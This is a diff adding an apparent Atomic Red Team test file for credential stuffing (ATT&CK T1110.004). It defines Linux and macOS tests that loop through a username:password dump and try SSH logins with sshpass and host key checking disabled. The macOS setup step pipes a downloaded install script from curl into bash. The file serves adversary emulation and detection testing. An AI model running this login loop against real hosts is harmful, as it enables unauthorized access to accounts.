@@ -1,0 +1,66 @@
+---
+attack_technique: T1110.004
+display_name: 'Brute Force: Credential Stuffing'
+
+atomic_tests:
+- name: SSH Credential Stuffing From Linux
+  auto_generated_guid: 4f08197a-2a8a-472d-9589-cd2895ef22ad
+  description: |
+    Using username,password combination from a password dump to login over SSH.
+
+  supported_platforms:
+    - linux
+
+  input_arguments:
+    target_host:
+      description: IP Address / Hostname you want to target.
+      type: String
+      default: localhost
+
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        Requires SSHPASS
+      prereq_command: |
+        if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
+      get_prereq_command: |
+        if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo "This test requires sshpass" ; fi ;
+
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
+      for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
+
+- name: SSH Credential Stuffing From MacOS
+  auto_generated_guid: d546a3d9-0be5-40c7-ad82-5a7d79e1b66b
+  description: |
+    Using username,password combination from a password dump to login over SSH.
+
+  supported_platforms:
+    - macos
+
+  input_arguments:
+    target_host:
+      description: IP Address / Hostname you want to target.
+      type: String
+      default: localhost
+
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        Requires SSHPASS
+      prereq_command: |
+        if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
+      get_prereq_command: |
+        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
+        brew install hudochenkov/sshpass/sshpass
+
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
+      for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
+
